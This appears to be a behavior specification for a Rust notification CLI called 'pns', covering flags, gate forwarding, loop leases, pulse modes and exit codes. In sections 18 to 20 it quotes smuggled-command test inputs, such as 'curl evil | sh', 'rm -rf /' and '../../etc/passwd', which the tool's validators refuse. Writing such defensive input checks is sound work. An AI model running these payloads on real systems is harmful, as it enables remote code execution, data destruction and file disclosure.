- Thresholds: both flags. One step either side: `--local-only` alone plans the local surfaces,
  `--remote-only` alone plans the durable ones.

- Required side effects: the decision ring record is still written ("nothing fired" is exactly what an
  operator opens the report to ask about), and the journal entry is still written on the first attempt.

- Forbidden side effects: no channel spawn, and no pane-scrub warning, because a scrub nobody was going
  to receive is not news (`src/main.rs:dispatch_legs` is never reached).

- Timeout and cancellation: Not applicable, nothing is dialled.

- Idempotency and duplicates: one printed line per invocation.

- Privacy: nothing leaves the machine.

- Process ownership and cleanup: Not applicable.

- Compatibility contract: exit 0, the `SKIPPED` line on stdout, stderr free of the pane-scrub warning.
  Naming tests: `tests/dispatch.rs:both_narrowing_flags_together_deliver_nothing_and_say_so`,
  `tests/dispatch.rs:a_scrub_warning_is_not_printed_when_no_channel_will_run`,
  `tests/dispatch.rs:a_non_unicode_argument_never_breaks_the_exit_zero_edge`.

### 16. `--long-running` is the tier the lamps ride on

Given `--long-running` on a producer invocation\

When `decide` is called with `event.long_running`\

Then `surface::plan` sets `pulse: long_running` unconditionally, and the mobile card is allowed through a watched pane only when `long_running && mobile_watch_card` are both true.

- Success: the event's plan carries a pulse, and with a `[lights]` table and hue enabled the lamps are
  signalled from the engine's own delivery plan rather than from a second call.
- Failure sources: the flag being eaten as a preceding value flag's value, which is behavior 8's
  protected case.
- Fail direction: the tier is additive. The lights signal rides on top of whatever else the plan decides
  (`src/args.rs:EventArgs::long_running` doc comment).
- Thresholds: the shell producer applies the flag at 300 seconds and omits it between 30 and 299 seconds
  (`dot_bashrc.tmpl:575-581`). One step either side: at 299 seconds the event goes through the ordinary
  presence gate with no lights tier; at 300 seconds it adds `--long-running`.
- Required side effects: `plan.pulse` is what the decision ring records (`src/main.rs:run_event` comment
  at the pulse site).
- Forbidden side effects: a muted decision plans no pulse even for a long-running event
  (`src/engine.rs:a_muted_decision_plans_no_pulse_even_for_a_long_running_event`).
- Timeout and cancellation: Not applicable at the flag level.
- Idempotency and duplicates: the flag is a boolean; repeating it changes nothing.
- Privacy: Not applicable.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: `--long-running` must stay in `BARE_FLAGS`. Naming test:
  `src/args.rs:the_long_running_flag_is_protected_from_being_eaten_like_every_other_one`, with the plan
  half at `src/surface.rs:every_long_running_row_pulses_whatever_else_it_decides`.

### 17. `--channel <route>` names a hermes route, never a URL

Given `--channel log`\

When `hermes_url_for` resolves the endpoint\

Then `PNS_HERMES_URL` wins if set and non-empty; else an empty channel gives `DEFAULT_HERMES_URL` (`http://127.0.0.1:8644/webhooks/pns`); else `channel_url` swaps the final path segment for the route.

- Success: the post goes to `<gateway>/<route>` with the host and port unmoved.
- Failure sources: a route name `safety::route_name_is_usable` refuses (empty, or anything outside ASCII
  letters, digits, `-` and `_`).
- Fail direction: loud-ward. An unusable name prints
  `pns: --channel "<name>" is not a usable route name; posting to the default route` and posts to the
  default, because a misrouted notification on the loud route beats a silently dropped one
  (`src/main.rs:hermes_url_for`).
- Thresholds: the allowlist is exactly ASCII alphanumeric plus `-` and `_`, non-empty. One step either
  side: `log_2` is usable; `a/b`, `../x`, `a b`, `a?x=1`, `a#f`, `.`, `a\nb`, `%2e%2e` and `café` are not
  (`src/channels/hermes.rs:one_rule_judges_a_route_name_wherever_it_is_read`).
- Required side effects: the warning line above, on stderr, when the name is refused.
- Forbidden side effects: the gateway host and port must never move with the route swap.
- Timeout and cancellation: the leg's own deadline, as in behavior 14.
- Idempotency and duplicates: last `--channel` wins, per behavior 6.
- Privacy: the route name is echoed in the refusal warning in Rust debug form (quoted).
- Process ownership and cleanup: Not applicable.
- Compatibility contract: names cross the command line, never URLs. Naming tests:
  `src/args.rs:the_channel_flag_names_a_route_and_is_protected_like_every_value_flag` (the flag is parsed
  and protected) and `src/channels/hermes.rs:one_rule_judges_a_route_name_wherever_it_is_read` (the name
  is judged by one rule). `NOT ESTABLISHED:` no test drives `--channel` from argv through to the wire.
  `tests/native.rs:the_stale_alert_posts_to_the_hermes_route_the_config_named` pins the CONFIG-named
  route (`stale_alert_channel`) on the wire, not the flag, and its own doc comment records that the
  assignment of a route onto a URL was once unpinned. The producer flag's assignment at
  `src/main.rs:3270` is the corresponding unpinned edge for the argv path.

### 18. `--pane <id>` is scrubbed when it carries shell metacharacters

Given `--pane "wW:p1; curl evil | sh"` with at least one channel planned\

When `decide` computes `pane_dropped` and `dispatch_legs` acts on it\

Then the pane is replaced with the empty string in every delivered event and one warning is printed.

- Success: every channel receives `pane == ""`, and stderr carries
  `pns: dropped a pane id with shell metacharacters; no channel will focus a pane`.
- Failure sources: a pane id from another program (herdr's `HERDR_PANE_ID`) reaching a channel that
  interpolates it.
- Fail direction: closed. The scrub happens once at the composition root rather than per channel, because
  a channel may be written in any language and cannot be expected to share the guard
  (`src/main.rs:dispatch_legs`).
- Thresholds: `safety::pane_is_safe` accepts a non-empty string of ASCII alphanumerics plus `.`, `_`, `:`
  and `-`. One step either side: `wW:p21` passes; `wW:p21; curl evil | sh` does not. `pane_dropped` is
  false for an EMPTY pane, since `!pane.is_empty()` guards the check (`src/engine.rs:244`).
- Required side effects: exactly one warning line, printed only when a channel will run.
- Forbidden side effects: no warning when the plan is empty
  (`tests/dispatch.rs:a_scrub_warning_is_not_printed_when_no_channel_will_run`).
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: one warning per invocation.
- Privacy: the warning does not echo the offending pane id.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: the pane is what makes a banner click focus a pane, so an empty pane is a
  banner that focuses nothing rather than a suppressed delivery. Naming test:
  `tests/dispatch.rs:a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event`.

### 19. The bare gate spelling `pns <harness>-hook`

Given argv[1] shaped `<name>-hook`, with `<name>` non-empty and all ASCII lowercase\

When `hooks::is_harness_subcommand` accepts it\

Then `gate_mode` runs: it declines (exit 0) unless moshi is present and the operator is away, then reads the payload from stdin and passes it through to `moshi-hook <name>-hook`.

- Success: moshi's own exit code is returned. `tests/hooks.rs` stubs moshi at 7 and asserts 7 comes back,
  with the payload arriving on moshi's stdin byte for byte and the argv being exactly `pi-hook`.
- Failure sources: a word that fails the shape test, no moshi, the operator at the desk, an absent or
  over-cap payload.
- Fail direction: exit 0 means "not forwarded" on every declining path, which is the harness's "no
  opinion, prompt as usual" (`src/main.rs:gate_mode`). A word that fails the SHAPE test falls out of this
  branch entirely and is then refused by behavior 3 with exit 2, because the bare spelling is
  indistinguishable from a typo at that point.
- Thresholds: the shape is `split_once('-')`, suffix exactly `hook`, name non-empty and all ASCII
  lowercase (`src/hooks.rs:is_harness_subcommand`). One step either side: `pi-hook` is accepted;
  `Pi-hook`, `-hook`, `pi-hook; rm -rf /` and `../../etc/passwd` are refused with exit 2.
- Required side effects: the payload is forwarded unchanged when it is forwarded at all.
- Forbidden side effects: the gate raises no event of its own; it forwards or it declines.
- Timeout and cancellation: the wait on moshi is bounded at the shared seam by
  `answer_within(child, submit_deadline())`, stated in `src/main.rs:gate_mode` as necessary because pi
  and omp reach this entry point with no pns hook in front of it.
- Idempotency and duplicates: `tests/hooks.rs:the_gate_submits_one_prompt_exactly_once` pins the single
  submission.
- Privacy: the payload is another program's and crosses to moshi unchanged.
- Process ownership and cleanup: `spawn_moshi_hook` owns the child; `answer_within` bounds the wait.
- Compatibility contract: the bare word exists because moshi's generated pi and omp extensions hold one
  pathname in `helperBinary` with no room for a subcommand
  (`.chezmoiscripts/run_after_62-bounce-moshi-hook-on-upgrade.sh.tmpl:60-63`). Naming tests:
  `tests/hooks.rs:the_bare_harness_word_forwards_through_the_gate_and_returns_the_decision`,
  `tests/hooks.rs:a_shape_the_gate_will_not_vouch_for_is_never_handed_to_moshi`,
  `tests/hooks.rs:a_zero_decision_passes_through_as_zero_and_is_not_a_default`.

### 20. The documented gate spelling `pns gate <harness>-hook`

Given argv `gate pi-hook`\

When `main` matches `first == "gate"` and calls `gate_mode(&second_argument())`\

Then the same gate runs and returns the same decision.

- Success: moshi's exit code (7 in the test), moshi's argv exactly `pi-hook`, and no event raised.
- Failure sources: a second word the gate will not vouch for.
- Fail direction: exit 0, silently, with nothing handed to moshi and no notification. This is the one
  place the two spellings DIFFER: `gate <bad word>` exits 0, while a bare `<bad word>` exits 2 through
  behavior 3.
- Thresholds: the same `is_harness_subcommand` shape test. One step either side: `gate pi-hook` forwards;
  `gate ""`, `gate nonsense`, `gate ../../etc/passwd` and `gate "pi-hook; rm -rf /"` all exit 0 without
  reaching moshi.
- Required side effects: none on the declining path.
- Forbidden side effects: no event of its own. Falling through to event mode here is how a bogus
  notification about an empty event once got out (`tests/dispatch.rs` companion comment and
  `tests/hooks.rs:the_documented_gate_subcommand_reaches_the_same_gate_as_the_bare_word`).
- Timeout and cancellation: as behavior 19.
- Idempotency and duplicates: as behavior 19.
- Privacy: as behavior 19.
- Process ownership and cleanup: as behavior 19.
- Compatibility contract: both spellings end in `gate_mode`. Naming tests:
  `tests/hooks.rs:the_documented_gate_subcommand_reaches_the_same_gate_as_the_bare_word`,
  `tests/hooks.rs:the_gate_subcommand_refuses_a_word_it_will_not_vouch_for_without_notifying`.

### 21. `pns loop begin|end`

Given argv `loop <verb> [--pane <id>]`\

When `loop_mode` reads the verb from `second_argument()` and the remaining arguments from `args_os().skip(3)`\

Then `lights::loop_command` resolves the pane FIRST and the verb SECOND, and the lease marker is written or removed.

- Success: `begin` writes the lease marker for the pane and registers the lamps' tick for the whole lease
  timeout; `end` removes the marker. Exit 0 in both cases.
- Failure sources: no pane, an unsafe pane, an unknown verb, an unknown argument shape, an unreadable
  clock, an unwritable marker, an unremovable marker.
- Fail direction: loud, because a human is waiting on the answer. A lease that was not taken is a lamp
  that never lights, and reporting success for one is the worst outcome available
  (`src/main.rs:loop_mode`).
- Thresholds: the argument grammar is exactly `[]` (take the pane from `HERDR_PANE_ID`) or
  `["--pane", <id>]`; anything else is `LOOP_USAGE`. The pane must satisfy `safety::pane_file_is_safe`,
  which is `pane_is_safe` plus a refusal of `..` and of this crate's own working-file grammar. One step
  either side: `--pane wW:p9` is accepted; `--pane ../x` and `--pane abc.new.1` are refused by name.
- Required side effects on `begin`: the marker file, and a scheduled lamps tick covering
  `lights.looping.lease_timeout_secs` when a config with a `[lights]` table loads.
- Forbidden side effects: no lease at epoch zero. When the clock cannot be read, `begin` prints
  `pns: loop: the clock cannot be read; the lease was not taken` and exits 1 rather than writing a marker
  that would be expired the moment it was written.
- Timeout and cancellation: the lease itself times out on its own, so the lamp is never stuck for good;
  the command holds no timer.
- Idempotency and duplicates: `end` on a machine that never began, or a second `end` after the first, is
  not a failure. `end_lease` returns `Ok(())` for both an unnameable marker and a `NotFound` removal
  (`src/main.rs:end_lease`).
- Privacy: the pane id is echoed in the refusal messages in Rust debug form (quoted).
- Process ownership and cleanup: no child process; only files under the state directory.
- Compatibility contract, exact strings:
  - no pane:
    `pns: loop: no HERDR_PANE_ID in this environment, so there is no pane to key the lease to; run it inside the pane, or name one with --pane`,
    exit 2
  - unsafe pane: `pns: loop: "<pane>" is not a pane id this can key a lease to`, exit 2
  - unknown verb or argument shape: `LOOP_USAGE`, exit 2
  - unreadable clock: `pns: loop: the clock cannot be read; the lease was not taken`, exit 1
  - unwritable marker: `pns: loop: the lease could not be written: <error>`, exit 1
  - unremovable marker:
    `pns: loop: the lease could not be given back (<error>); the loop lamp keeps breathing until it times out`,
    exit 1
  - Naming tests:
    `src/lights.rs:a_lease_is_keyed_to_the_pane_it_was_typed_in_and_refused_when_there_is_none`,
    `src/lights.rs:a_pane_that_cannot_name_a_file_and_an_argument_this_does_not_know_are_refused`,
    `tests/dispatch.rs:a_lease_taken_by_hand_schedules_the_tick_that_reads_it`.
  - Ordering note: the pane is resolved before the verb is matched (`src/lights.rs:loop_command`), so
    `pns loop wobble` with no `HERDR_PANE_ID` reports the NO PANE refusal, not `LOOP_USAGE`. Pinned by
    the `("resume", vec![], Some("wW:p21"))` case in
    `src/lights.rs:a_pane_that_cannot_name_a_file_and_an_argument_this_does_not_know_are_refused`, which
    supplies a pane precisely so the usage refusal is what surfaces.

### 22. `pns pulse <exit-code>`

Given argv `pulse [<word>...]`\

When `pulse_mode` reads the WHOLE tail via `args_os().skip(2)`\

Then help wins anywhere in the tail; a tail longer than one token is refused; the single word is mapped by `pulse::exit_behaviour`; and the pulse fires only if its own table says enabled.

- Success: a bare `pulse` or an all-zeroes code is a success pulse (`config::Behaviour::Done`); any other
  all-digit code is a failure pulse (`config::Behaviour::Failed`). Exit 0.
- Failure sources: a word that is not an ASCII-digit run, an extra tail token, a config that could not be
  parsed.
- Fail direction: FAIL CLOSED, unlike an event. The roster fallback that keeps every notification working
  through a broken config is an event-mode rule; applying it here would let an unrelated typo switch a
  deliberately disabled pulse back on (`src/main.rs:pulse_mode`). A broken config prints the sanitized
  error and does NOT pulse, still exiting 0.
- Thresholds: `exit_behaviour` accepts empty, or a string every character of which is an ASCII digit. All
  zeroes is `Done`; anything else numeric is `Failed` (`src/pulse.rs:exit_behaviour`). One step either
  side: `0` and `000` are success pulses; `1` is a failure pulse; `-0`, `" 0"`, `"0\n"` and `oops` are
  refusals. Tail length: 0 or 1 token is accepted, 2 or more is refused (`0 stray` and `0 a b` are both
  refusals).
- Required side effects: `fire_pulse(enabled_hue_table(&config), behaviour)` on the success path only.
- Forbidden side effects: no bridge is dialled when the pulse is disabled, whatever else the config got
  wrong (`tests/dispatch.rs:an_unknown_plugin_never_resurrects_a_disabled_pulse` asserts a listener is
  never accepted).
- Timeout and cancellation: the bridge call carries the hue deadlines (`channels::hue::BRIDGE_DEADLINE`,
  `TYPED_COMMAND_DEADLINE`); the argv layer holds no timer.
- Idempotency and duplicates: one pulse per invocation. The shell no longer makes a second `pns pulse`
  call of its own, so the tier is decided once.
- Privacy: no secret is printed on any path; a config error is printed via `error.detail()`, which is the
  sanitized detail.
- Process ownership and cleanup: no child; the bridge call is in-process.
- Compatibility contract:
  - help: `PULSE_USAGE` on stdout, stderr empty, exit 0, and NO config load at all, so it answers even
    with no config on disk. Naming test:
    `tests/dispatch.rs:pulse_help_prints_its_own_usage_before_any_config_load`.
  - refusal: `PULSE_USAGE` on stderr, stdout empty, exit 2. Naming test:
    `tests/dispatch.rs:pulse_refuses_a_code_it_cannot_read_instead_of_guessing_it_failed`.
  - broken config: stderr exactly `pns: config error (<detail>); no pulse`, exit 0. Naming tests:
    `tests/dispatch.rs:a_broken_config_says_so_in_pulse_mode_too_instead_of_dying_quietly`,
    `tests/dispatch.rs:the_pulse_config_warning_says_what_pulse_mode_actually_did`.
  - absent config: stdout and stderr both exactly empty, exit 0, because absent is not a mistake and
    never opting in earns no warning. Naming test:
    `tests/dispatch.rs:an_absent_config_stays_silent_in_pulse_mode`.

### 23. Exit codes across the surface

Given any invocation of the binary\

When it terminates\

Then the exit code falls into exactly one of four classes.

- Success: 0 on every producer event path, on help, on a declining gate, on `pns home`, and on a
  successful subcommand.
- Failure sources and their codes:
  - `0`: every producer event delivery, including a plan that reached no channel; help; a gate that
    declined; a pulse that fired, was disabled, found no config, or found a broken one; `hook <event>`
    for every event except `blocked`; `pns home` always (`src/main.rs` module doc names `home` as an open
    gap for that reason).
  - `1`: `loop begin` when the clock cannot be read or the marker cannot be written, and `loop end` when
    the marker cannot be removed.
  - `2`: a word naming no command; a mistyped flag; the literal empty first word; a pulse tail that
    cannot be read; a bad `loop` verb, pane or argument shape; a bad `lights` verb; a bad `quiet`,
    `setup`, `doctor` or `recap` invocation; a bare gate word that fails the shape test.
  - moshi's own code: a gate or a `hook blocked` that actually forwarded. In production that is 0
    whichever way the operator answered (`src/main.rs:gate_mode` doc comment).
- Fail direction: the always-exit-0 contract governs EVENT deliveries and the hook path, because a
  notification must never fail the work it reports on. A word naming no command never becomes an event,
  so refusing it with 2 contradicts nothing (`src/main.rs:main`).
- Thresholds: Not applicable, these are discrete codes.
- Required side effects: none beyond the per-behavior ones above.
- Forbidden side effects: no producer event path may exit non-zero. The shared test helper
  `tests/support/mod.rs:run` asserts `output.status.success()` with the message
  `the engine must exit 0 on every path`, so every test that calls it pins this.
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: Not applicable.
- Privacy: Not applicable.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: the two known gaps are recorded in the `src/main.rs` module documentation:
  `home` is a diagnostic that always exits 0, and a word trailing `lights tick` is dropped rather than
  refused. Naming tests: `tests/support/mod.rs:run` (the exit-0 assertion every dispatch test inherits),
  `tests/dispatch.rs:a_word_that_names_no_command_is_refused_and_delivers_nothing`,
  `tests/hooks.rs:the_bare_harness_word_forwards_through_the_gate_and_returns_the_decision`.

## Gaps

Every `NOT ESTABLISHED:` line in this file, collected:

1. Behavior 2a: no test asserts the dispatch order for a subcommand word carrying producer flags (for
   example `pns doctor --agent x`). The claim rests on reading `src/main.rs:main`.
1. Behavior 6: no test asserts that a repeated value flag is last-wins. The claim rests on the assignment
   in `src/args.rs:parse_args`.
1. Behavior 14: no test in this crate asserts the exact stdout string `pns: posted HTTP 200` that
   `log-entries.sh` greps for; the shell comment itself records the reader side as unpinned.
1. Behavior 17: no test drives `--channel` from argv through to the wire. The flag's parse and the route
   name's rule are each pinned separately; the assignment at `src/main.rs:3270` is not.
1. The callers table: the argv `uu` passes through its `[alerts] binary` is not derivable from this
   repository.
